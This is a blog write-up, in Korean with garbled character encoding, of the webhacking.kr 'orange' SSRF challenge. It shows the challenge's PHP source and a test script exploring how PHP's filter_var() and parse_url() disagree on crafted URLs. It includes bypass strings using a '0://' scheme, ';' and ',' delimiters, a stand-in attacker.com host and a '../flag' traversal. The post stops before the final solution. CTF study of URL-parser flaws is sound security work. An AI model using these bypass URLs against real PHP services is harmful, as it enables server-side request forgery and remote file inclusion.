---
title: ["[Webhacking.kr] ğŸŠ (ssrf - 200)"]
date: 2024-12-01 09:00:00 +0900
categories: [writeup, webhacking.kr]
tags: [web, ssrf]
---

```php
<?php
  if($_GET['view_source']){ highlight_file(__FILE__); exit; }
  if($_GET['view_version']){ echo phpversion(); exit; }
  if($_GET['ls']){ system("ls -a"); exit; } // to prove for about there is not hidden files in this directory. you dont have to run dirbuster!
  if(isset($_GET['url'])){
    $url = $_GET['url'].".txt";
    if(!filter_var($url, FILTER_VALIDATE_URL)) exit("invalid url");
    if(!preg_match("/http:\/\/webhacking.kr:10009\//",$url)) exit("invalid server");
    if(preg_match("/@|#|\(|\)|\\$|`|'|\"|_|{|}|\?/",$url)) exit("you are not orange");
    if((parse_url($url)['host'] !== "webhacking.kr") || (parse_url($url)['port'] !== 10009)) exit("invalid host or port");
    if(parse_url($url)['user'] || parse_url($url)['pass']) exit("you are not orange");
    include $url;
  }
  echo "<hr><a href=./?url=http://webhacking.kr:10009/cat>cat</a> <a href=./?url=http://webhacking.kr:10009/dog>dog</a> <hr><a href=./?view_source=1>view-source</a> <a href=./?view_version=1>view-version</a> <a href=./?ls=1>ls</a>";
?>
```

* .txt í™•ì¥ìê°€ ìë™ìœ¼ë¡œ ì¶”ê°€ë¨
* `FILTER_VALIDATE_URL`ë¡œ ìœ íš¨í•œ URLì¸ì§€ ê²€ì‚¬
* URLì´ http://webhacking.kr:10009/ë¡œ ì‹œì‘í•˜ëŠ”ì§€ ê²€ì‚¬
* íŠ¹ìˆ˜ë¬¸ì `@`,`#`,`(`,`)`,`$`,`` ` ``,`'`,`"`,`_`,`{`,`}`,`?`, ì‚¬ìš© ë¶ˆê°€
* hostê°€ "webhacking.kr"ì´ê³  portê°€ 10009ì¸ì§€ ê²€ì‚¬
* URLì— userì™€ pass ì •ë³´ê°€ ì—†ì–´ì•¼ í•¨

ì´ë²ˆ ë¬¸ì œë¥¼ í’€ê¸° ìœ„í•´ì„œ ì´í•´í•´ì•¼í•  ê°œë…ì„ ë¨¼ì € ì •ë¦¬í•´ë³´ì.  

### FILTER_VALIDATE_URL

PHPì—ì„œ URLì˜ í˜•ì‹ì´ RFC í‘œì¤€ì„ ë”°ë¥´ëŠ”ì§€ ê²€ì¦í•˜ëŠ” í•„í„°ì´ë‹¤.  
1. schemeì´ ìˆì–´ì•¼ í•¨ - http://, https://ë“±
2. hostê°€ ìˆì–´ì•¼ í•¨
3. ìœ íš¨í•œ ë¬¸ìë§Œ ì‚¬ìš©ë˜ì–´ì•¼ í•¨

### Bypass URL Validation and Regular Expression

[A New Era of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) 2017 Black Hatì—ì„œ Orange Tsaiê°€ ë°œí‘œí•œ ë‚´ìš©ì´ë‹¤.  
(ì•„ë§ˆ ë¬¸ì œì˜ ì œëª©ì´ orangeì¸ ì´ìœ ë„ ì´ê²ƒ ë•Œë¬¸ì´ì§€ ì•Šì„ê¹Œ..)

URI RFC êµ¬ë¬¸ì˜ íŠ¹ì§•ìœ¼ë¡œ `;`, `,`ì™€ ê°™ì€ íŠ¹ìˆ˜ë¬¸ìë“¤ì€ URLì˜ scheme-specific ë¶€ë¶„ì—ì„œ íŠ¹ë³„í•œ ìš©ë„ë¡œ ì˜ˆì•½ë˜ì–´ ìˆë‹¤.  
ì´ëŸ° íŠ¹ìˆ˜ë¬¸ìë“¤ì´ í¬í•¨ëœ URLì„ íŒŒì‹±í•  ë•Œ, `filter_var()`ê³¼ ê°™ì€ URL ê²€ì¦ í•¨ìˆ˜ì™€ ì‹¤ì œ HTTP ìš”ì²­ ì‹œì˜ ì¸ì‹ì´ ë‹¤ë¥¼ ìˆ˜ ìˆë‹¤.  
ì´ëŸ° URL íŒŒì‹±ì˜ ë¶ˆì¼ì¹˜ë¥¼ ì´ìš©í•˜ì—¬ SSRFë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ ìˆë‹¤.  

```php
echo "<pre>";
echo "PHP Version: " . phpversion() . "<br><br>";

// Test cases for URLs
$test_urls = [
    'http://google.com',
    'https://google.com:80',
    'http://attacker.com;google.com',
    '0://attacker.com;google.com',
    '0://attacker.com:80,google.com:80',
    '0://attacker.com:80,google.com:80/../../../../flag'
];

// Test each URL
foreach ($test_urls as $url) {
    echo "=== Testing URL: " . htmlspecialchars($url) . " ===<br>";
    
    // URL Validating
    $is_valid = filter_var($url, FILTER_VALIDATE_URL);
    echo "Valid URL: " . ($is_valid ? "Yes" : "No") . "<br>";
    
    // URL Parsing
    $parsed = parse_url($url);
    if ($parsed) {
        echo "URL Components:<br>";
        echo "- Scheme: " . (isset($parsed['scheme']) ? $parsed['scheme'] : 'N/A') . "<br>";
        echo "- Host: " . (isset($parsed['host']) ? $parsed['host'] : 'N/A') . "<br>";
        echo "- Port: " . (isset($parsed['port']) ? $parsed['port'] : 'N/A') . "<br>";
        echo "- Path: " . (isset($parsed['path']) ? $parsed['path'] : 'N/A') . "<br>";
        echo "- User: " . (isset($parsed['user']) ? $parsed['user'] : 'N/A') . "<br>";
        echo "- Pass: " . (isset($parsed['pass']) ? $parsed['pass'] : 'N/A') . "<br>";
    } else {
        echo "Could not parse URL<br>";
    }
    echo "<br>";
}
echo "</pre>";
```

PHP 7.3ë²„ì „ì—ì„œ `filter_var()`í•¨ìˆ˜ì™€ `parse_url()`í•¨ìˆ˜ê°€ ì–´ë–»ê²Œ ë™ì‘í•˜ëŠ”ì§€ ìì„¸íˆ ì•Œì•„ë³´ì.  

```
=== Testing URL: http://attacker.com;google.com ===
Valid URL: No
URL Components:
- Scheme: http
- Host: attacker.com;google.com
```
ë‹¨ìˆœíˆ `;`ê³¼ ê°™ì€ delimiterë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒìœ¼ë¡œëŠ”, `filter_var()`í•¨ìˆ˜ë¥¼ ìš°íšŒí•˜ì§€ ëª»í•œë‹¤.  

```
=== Testing URL: 0://attacker.com;google.com ===
Valid URL: Yes
URL Components:
- Scheme: 0
- Host: attacker.com;google.com
```  
 `http://` ëŒ€ì‹  `0://`ì„ ì‚¬ìš©í•œë‹¤ë©´, `filter_var()`ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆë‹¤.  
 í•˜ì§€ë§Œ, `Host`ì— `;google.com`ì´ í¬í•¨ë˜ì–´, `curl` ë“±ìœ¼ë¡œ ì •ìƒì ìœ¼ë¡œ í†µì‹ ì„ ìš”ì²­í•˜ì§€ ëª»í•œë‹¤.  

```
=== Testing URL: 0://attacker.com:80,google.com:80 ===
Valid URL: Yes
URL Components:
- Scheme: 0
- Host: attacker.com:80,google.com
- Port: 80
```  
ìœ„ì™€ ê°™ì´ í¬íŠ¸ê¹Œì§€ ì§€ì •ì„ í•´ì¤€ë‹¤ë©´ curlì´ `Host`ë¥¼ ì½ì„ ë•Œ, í¬íŠ¸ ì•ê¹Œì§€ë§Œ ì½ì–´ `attacker.com`ìœ¼ë¡œ í†µì‹ ì´ ì„±ê³µí•œë‹¤.  



